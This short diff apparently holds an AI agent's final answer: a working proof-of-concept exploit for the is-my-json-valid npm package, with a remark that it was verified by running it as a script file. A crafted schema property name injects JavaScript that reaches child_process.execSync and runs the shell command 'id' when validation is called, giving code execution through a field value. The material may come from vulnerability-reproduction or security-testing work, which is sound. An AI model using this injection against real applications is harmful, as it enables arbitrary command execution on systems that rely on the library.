@@ -1,0 +1,18 @@
+That confirms `-e` eval mode lacks `process.mainModule` (expected — only real script files have it), but the actual snippet file (written to disk, run via `node snippet.js`) works as verified above. This is my final answer:
+
+```javascript
+const validator = require("./node_modules/is-my-json-valid")
+
+const schema = {
+  type: "object",
+  properties: {
+    "x[console.log(process.mainModule.require(`child_process`).execSync(`id`).toString(`utf-8`))]": {
+      required: true,
+      type: "string"
+    }
+  },
+}
+
+var validate = validator(schema)
+validate({})
+```
